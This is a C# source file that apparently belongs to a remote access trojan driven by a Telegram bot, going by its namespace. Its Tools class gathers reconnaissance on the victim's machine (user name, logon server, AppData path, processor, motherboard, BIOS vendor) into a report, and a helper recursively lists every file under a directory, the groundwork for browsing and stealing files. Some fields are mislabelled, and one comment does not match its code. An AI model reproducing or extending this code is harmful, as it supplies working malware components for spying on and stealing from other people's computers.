using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using RAT_BotTelegram.Lib;
using System.IO;

namespace RAT_BotTelegram.Lib {
    internal sealed class Tools {

        public static String PC_Info() {
            Console.WriteLine(Features.getArchitecture());
            String Info = "Detailed Computer Information" +

                "\n\n*UserData *" +
                "\n - User Name: "+ Features.getArchitecture()+
                "\n - User Profile: C:\\User\\" + Features.getUserName() +
                "\n - User Domain: " + Features.getUserName() +
                "\n - Logon Server: " + Features.getLogonServer() +
                "\n - AppData: C:\\Users\\" + Features.getUserName() + @"\AppData\Roaming " +
                "\n - Home Path: \\Users\\" + Features.getUserName() +


                "\n\n*Processor *" +
                "\n - Name: " + Features.getProcessorName() +
                "\n - Frequency: " + Features.getProcessorGhz() + " Ghz"+
                "\n - Architecture: " + Features.getArchitecture() +


                "\n\n*Motherboard *"+
                "\n - Name: " + Features.getMotherboardName() +
                "\n - Manufacturer: " + Features.getMotherboardManufacturer() +
                "\n - BIOSVendor: " + Features.getBIOSVendor() +

                "";


            return Info;
        }

        private static string[] GetFile(string dir) {
            // Obtiene Nombre del procesador
            string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);

            return allfiles;
        }

    }
}
